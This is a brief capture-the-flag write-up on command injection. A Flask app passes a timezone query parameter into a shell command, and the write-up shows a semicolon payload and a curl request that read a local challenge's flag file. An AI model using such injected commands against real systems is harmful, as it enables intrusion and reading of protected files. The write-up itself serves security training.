# CMDi 4

```shell
cat /challenge/server
```

The Flask app takes a timezone as query param (`/initiative?time-region`) and executes `TZ={time-region} date`

Executing: \
TZ=**Hogwarts;cat /flag;** date

Start the server and use curl:

```shell
curl http://challenge.localhost:80/initiative?time-region=Hogwarts%3Bcat%20%2Fflag%3B
```
